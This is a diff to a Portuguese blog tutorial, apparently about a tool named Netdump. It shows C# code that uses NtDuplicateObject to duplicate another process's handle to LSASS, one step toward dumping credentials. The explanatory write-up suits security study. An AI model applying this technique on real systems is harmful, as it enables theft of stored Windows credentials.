@@ -230,3 +230,60 @@ foreach (var index in handles)
 
 > - `NtDuplicateObject⁸`: API utilizada para duplicar um handle alvo.
 {: .prompt-info }
+
+Com os identificadores dos handles (PID e AccessRights) em mãos, o próximo passo é duplicá-los para, posteriormente, interagirmos com eles. O processo de duplicação é bem simples, ainda mais quando se tem uma API própria para isso.
+
+```csharp
+[Flags]
+public enum DUPLICATE_OPTION_FLAGS : uint
+{
+	CLOSE_SOURCE = 0x00000001,
+	SAME_ACCESS = 0x00000002,
+	SAME_ATTRIBUTES = 0x00000004
+}
+
+[DllImport("ntdll.dll")]
+public static extern NTSTATUS NtDuplicateObject(
+	IntPtr SourceProcessHandle,
+	IntPtr SourceHandle,
+	IntPtr TargetProcessHandle,
+	out IntPtr TargetHandle,
+	uint DesiredAccess,
+	bool InheritHandle,
+	DUPLICATE_OPTION_FLAGS Options
+);
+```
+
+```csharp
+uint acessOriginal = PROCESS_DUP_HANDLE;
+uint acessDuplicate = PROCESS_QUERY_INFORMATION | PROCESS_VM_READ;
+
+IntPtr hRemoteProcess = Netdump.Invokes.OpenProcess((uint)acessOriginal, false, pid);
+if (hRemoteProcess == IntPtr.Zero) { throw new Exception($"[-] OpenProcess: {Marshal.GetLastWin32Error()}"); }
+
+IntPtr hObject = new IntPtr(handle.HandleValue);
+
+Netdump.Tables.NTSTATUS result = Netdump.Invokes.NtDuplicateObject(
+	hRemoteProcess,
+	hObject,
+	new IntPtr(-1),
+	out IntPtr hDuplicate,
+	(uint)acessDuplicate,
+	true,
+	Netdump.Tables.DUPLICATE_OPTION_FLAGS.SAME_ACCESS
+);
+
+if (result == Netdump.Tables.NTSTATUS.STATUS_SUCCESS && hDuplicate != IntPtr.Zero)
+{
+	Console.WriteLine($"Handle duplicado! {hDuplicate}");
+}
+
+else { throw new Exception($"[-] NtDuplicateObject: {Marshal.GetLastWin32Error()}"); }
+
+Netdump.Invokes.CloseHandle(hRemoteProcess);
+Netdump.Invokes.CloseHandle(hDuplicate);
+Netdump.Invokes.CloseHandle(hObject);
+```
+
+Para duplicarmos um handle, precisamos de uma permissão crucial: `PROCESS_DUP_HANDLE⁹`. É esta permissão que será solicitada na abertura de um novo handle ao processo alvo (o de PID 6020, conforme visto no Process Hacker. É este processo que queremos porque é ele que possui o handle pro LSASS).
+Feito isso, é chamada a API `NtDuplicateObject` para a duplicação do handle que é especificado na variável `hObject`. O `hObject` é o identificador do handle LSASS que queremos duplicar. Pegamos este identificador graças a API `NtQuerySystemInformation`. E, por último, representado pelo `hDuplicate`, o handle duplicado! Mas não se engane: este ainda não é o handle do LSASS! :P
